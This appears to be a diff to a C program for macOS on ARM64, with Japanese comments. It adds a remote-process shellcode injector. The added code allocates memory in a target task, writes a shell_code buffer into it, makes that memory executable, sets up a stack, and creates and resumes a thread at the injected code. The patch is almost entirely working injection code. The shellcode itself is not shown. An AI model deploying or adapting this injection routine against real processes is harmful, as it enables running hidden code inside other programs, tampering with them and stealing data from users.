@@ -424,6 +424,117 @@ int main(int argc, char* argv[])
                 printf("%d: %lx -- ", i, result);
                 print_binary(result);
             }
+
+            // コード用メモリ領域確保
+            mach_vm_address_t code_addr = 0;
+            kr = mach_vm_allocate(task, &code_addr, whole_shellcode_size, VM_FLAGS_ANYWHERE);
+            if (kr != KERN_SUCCESS)
+            {
+                fprintf(stderr, "Failed to allocate code memory on target process.\n");
+                goto clean_symbol_memory;
+            }
+
+            // 書き込み・読み込み権限を付与
+            kr = vm_protect(task, code_addr, whole_shellcode_size, FALSE, VM_PROT_READ | VM_PROT_WRITE);
+            if (kr != KERN_SUCCESS)
+            {
+                fprintf(stderr, "Failed to change protect attribute on code memory.\n");
+                goto clean_symbol_memory;
+            }
+
+            // シェルコードの書き込み
+            kr = mach_vm_write(task, code_addr, (vm_offset_t)shell_code, (mach_msg_type_number_t)whole_shellcode_size);
+            if (kr != KERN_SUCCESS)
+            {
+                fprintf(stderr, "Failed to write shell code on target process.\n");
+                goto clean_symbol_memory;
+            }
+
+            // 実行権限付与に変更
+            kr = vm_protect(task, code_addr, whole_shellcode_size, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+            if (kr != KERN_SUCCESS)
+            {
+                fprintf(stderr, "Failed to change shell code memory as executable.\n");
+                goto clean_symbol_memory;
+            }
+
+            // スタック用メモリ領域確保
+            mach_vm_address_t stack_addr = 0;
+            vm_size_t stack_size = 4096;
+            kr = mach_vm_allocate(task, &stack_addr, stack_size, VM_FLAGS_ANYWHERE);
+            if (kr != KERN_SUCCESS)
+            {
+                fprintf(stderr, "Failed to allocate memory for stack.\n");
+                goto clean_symbol_memory;
+            }
+
+            // スタック領域を読み書き可能に
+            kr = vm_protect(task, stack_addr, stack_size, FALSE, VM_PROT_READ | VM_PROT_WRITE);
+            if (kr != KERN_SUCCESS)
+            {
+                fprintf(stderr, "Failed to change memory protect for stack memory.\n");
+                goto clean_symbol_memory;
+            }
+
+            // スタックポインタはスタック末尾付近
+            uint64_t sp = stack_addr + stack_size - 16;
+
+            // スレッド作成
+            thread_act_t new_thread;
+            kr = thread_create(task, &new_thread);
+            if (kr != KERN_SUCCESS)
+            {
+                fprintf(stderr, "Failed to create a new thread on target process: %s\n", mach_error_string(kr));
+                goto clean_symbol_memory;
+            }
+
+            // スレッド状態設定
+            arm_thread_state64_t state;
+            memset(&state, 0, sizeof(state));
+
+            state.__pc = code_addr;
+            state.__sp = sp;
+            state.__fp = sp;
+
+            mach_msg_type_number_t state_count = ARM_THREAD_STATE64_COUNT;
+            kr = thread_set_state(new_thread, ARM_THREAD_STATE64, (thread_state_t)&state, state_count);
+            if (kr != KERN_SUCCESS)
+            {
+                fprintf(stderr, "Failed to set thread set: %s.\n", mach_error_string(kr));
+                goto clean_symbol_memory;
+            }
+
+            // スレッド開始
+            kr = thread_resume(new_thread);
+            if (kr != KERN_SUCCESS)
+            {
+                fprintf(stderr, "Failed to resume new thread: %s\n", mach_error_string(kr));
+                goto clean_symbol_memory;
+            }
+
+            printf("Type 'exit' to exit.\n");
+
+            #define BUFFER_SIZE 100
+            char input[BUFFER_SIZE];
+            if (fgets(input, BUFFER_SIZE, stdin) != NULL)
+            {
+                input[strcspn(input, "\n")] = '\0';
+
+                if (strcmp(input, "exit") == 0)
+                {
+                    printf("Exiting.\n");
+                    goto clean_symbol_memory;
+                }
+                else
+                {
+                    printf("Input text: %s\n", input);
+                }
+            }
+            else
+            {
+                printf("Error was happend\n");
+                goto clean_symbol_memory;
+            }
         }
 
 clean_symbol_memory:
